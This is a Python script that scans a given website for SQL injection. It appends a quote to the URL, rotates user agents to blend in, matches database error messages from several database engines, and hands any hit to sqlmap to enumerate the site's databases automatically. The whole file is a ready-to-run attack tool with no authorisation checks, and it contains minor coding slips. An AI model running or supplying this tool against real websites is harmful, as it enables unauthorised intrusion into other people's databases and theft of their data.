
#
# Python script for finding websites which are prone to SQL injections
# Check url with qoute ' and catch error messages
# Run sqlmap against urls
#


import sys                          # Quit the shiat
import os                           # Working with files and starting sqlmap
import re                           # Searching web results for vuln
import requests                     # Calling websites
import urllib.parse                 # Parsing url encoding for search
import shutil                       # Checking if SQLmap is installed
import psutil                       # Checking possible VPN connection
import http.client                  # Ping to check network connection
import random                       # Shuffle between user agents
import time                         # Printing time when scraping and checking urls
from time import sleep              # Multiple use cases, e.g. sleep between requests
from bs4 import BeautifulSoup       # Working with website date


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ITALIC = '\x1B[3m'


# Variables which needs to be defined
#filenameRawUrl = "0"
#filenameVulnUrl = "0"


def LoadUserAgents(uafile="user_agents.txt"):
    # uafile : string, path to text file of user agents, one per line
    uas = []
    with open(uafile, 'rb') as uaf:
        for ua in uaf.readlines():
            if ua:
                uas.append(ua.strip()[1:-1-1])
    random.shuffle(uas)
    return uas



def checkUrlsForVuln():
    line = input(bcolors.ENDC + "  Enter a url to check for vunerability. : " + bcolors.OKBLUE)
    print("\n" + bcolors.HEADER)
    print(" ----------- Checking  if url is vunerable ----------------")
    print("\n" + bcolors.ENDC)
    sleep(2)

    
    # @type  verboseactive: str
    # @param verboseactive: Verboselevel.
    verboseactive = input(bcolors.ENDC + "  Select a Verboselevel (0, 1, 2): " + bcolors.OKBLUE)
    if not verboseactive:
        print(bcolors.WARNING + "  - Wrong input - only numeric values allowed. Using 0")
        verboseactive = "0"
   
    filename = "ddos" # + time.strftime("%Y%m%d-%H%M%S")
    if not os.path.isfile(filename):
        os.mknod(filename)
    print("  [*]  Connecting\n")

    checkMY1 = 0
    checkMY2 = 0
    checkMY3 = 0
    checkMY4 = 0
    checkMS1 = 0
    checkMS2 = 0
    checkMS3 = 0
    checkOR1 = 0
    checkOR2 = 0
    checkOR3 = 0
    checkPO1 = 0
    checkPO2 = 0
    try:
        # Get data
        url = line + "'"
        print(
            "  ["
            + time.strftime("%H:%M:%S")
            + "]  [*]  " + line.strip('\n')
            )
        # Loading random useragent
        uas = LoadUserAgents()
        ua = random.choice(uas)  # select a random user agent
        headers = {"Connection": "close", "User-Agent": ua}
        r = requests.get(url, headers=headers)
        soup = BeautifulSoup(r.text, 'lxml')

        # Check if vuln - might updated indicationstrings according to
        # MySQL
        checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))
        checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))
        checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))
        checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))
        # Microsoft SQL server
        checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))
        checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))
        checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))
        # Oracle Errors
        checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))
        checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))
        checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))
        # Postgre SQL
        checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))
        checkPO2 = len(soup.find_all(text=re.compile('unterminated quoted string at or near')))

        # Verbose level 1
        if verboseactive == "1":
            print("  [V]  Check1 MySQL found:    " + str(checkMY1))
            print("  [V]  Check2 MySQL found:    " + str(checkMY2))
            print("  [V]  Check3 MySQL found:    " + str(checkMY3))
            print("  [V]  Check4 MySQL found:    " + str(checkMY4))
            print("  [V]  Check5 MS SQL found:   " + str(checkMS1))
            print("  [V]  Check6 MS SQL found:   " + str(checkMS2))
            print("  [V]  Check7 MS SQL found:   " + str(checkMS3))
            print("  [V]  Check8 Oracle found:   " + str(checkOR1))
            print("  [V]  Check9 Oracle found:   " + str(checkOR2))
            print("  [V]  Check10 Oracle found:  " + str(checkOR3))
            print("  [V]  Check11 Postgre found: " + str(checkPO1))
            print("  [V]  Check12 Postgre found: " + str(checkPO2))

        # Verbose level 2
        if verboseactive == "2":
            checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
            checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
            checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
            checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
            print("  [V]  Check1 MySQL found:    " + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check2 MySQL found:    " + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check3 MySQL found:    " + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check4 MySQL found:    " + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

            checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
            checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
            checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
            print("  [V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

            checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
            checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
            checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
            print("  [V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

            checkverPO1 = soup.find(text=re.compile('Query failed:'))
            checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
            print("  [V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
            print("  [V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

        # If X is vuln
        if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
            print(
                bcolors.FAIL
                + "\n"
                + "                   Possible vuln url!"
                + bcolors.ENDC
                +"\n"
                + "  ["
                + time.strftime("%H:%M:%S")
                + "]  [+]  "
                + line + bcolors.ENDC
                + "\n"
                )
            with open(filename, 'a') as file:
                file.write(line)

            scanUrlsSQLmap(filename)


        else:
            print(
                bcolors.WARNING
                + "  ["
                + time.strftime("%H:%M:%S")
                + "]  [-]  " + line + bcolors.ENDC
                )

    # Skip X or/and exit
    except KeyboardInterrupt:
        print(bcolors.FAIL + "  [X]  " + line + bcolors.ENDC)
        quitnow = input(bcolors.ENDC + bcolors.BOLD + "  Exit program (y/N): " + bcolors.OKBLUE)
        if quitnow == "y":
            print(bcolors.ENDC + "  // Exiting\n\n")
            sys.exit()
        else:
            print(bcolors.ENDC + "  // Continuing\n\n")

    # Bad X
    except:
        print(bcolors.FAIL + "  [X]  " + line + bcolors.ENDC)

    # =================================
    # Done - sum it up
    # =================================
    print("\n  Done scanning url")

    sys.exit()


def scanUrlsSQLmap(filenameVulnUrl):
    print("\n\n\n" + bcolors.HEADER)
    print("----------  Scanning url with sqlmap -------------")
    print("\n" + bcolors.ENDC)

    # =================================
    # Check if sqlmap installed, file, etc.
    # =================================

    if shutil.which('sqlmap') is None:
        print("  SQLmap is not installed on system - can't go on.")
        print("  Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
        print("  \nCommand:")
        print("  sqlmap -m \"" + filenameVulnUrl + "\n")
        

    print(bcolors.ENDC + "  SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")

    fileDestination = (os.getcwd() + "/" + filenameVulnUrl)
    command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
    print("Command to execute: " + command)

    input(bcolors.ENDC + "  Press enter to continue\n")
    print(bcolors.ENDC + "  Starting SQLmap - follow onscreen instructions")
    print(bcolors.BOLD + "  Press Ctrl + c to exit\n\n\n")

    # RUN SQLMAP !!
    os.system(command)


def checkConnection():
    # Header request for net connectivity
    print(bcolors.ENDC + "\n  [*]  Checking for internet connection " + bcolors.ENDC)
    conn = http.client.HTTPConnection("www.microsoft.com", 80)
    try:
        conn.request("HEAD", "/")
        print(bcolors.OKGREEN + "  [+]  Internet Connection - Checked!  " + bcolors.ENDC)
    except:
        print(bcolors.FAIL + "  [-]  Oopss! Seems like your internet is down :( " + bcolors.ENDC)


    startpage()


def startpage():
    checkUrlsForVuln()

def main():
    os.system('clear')
    print("\n\n")
    print(bcolors.HEADER + "---------- SQL Injection using python -----------")
    checkConnection()

# Getting Started
main()
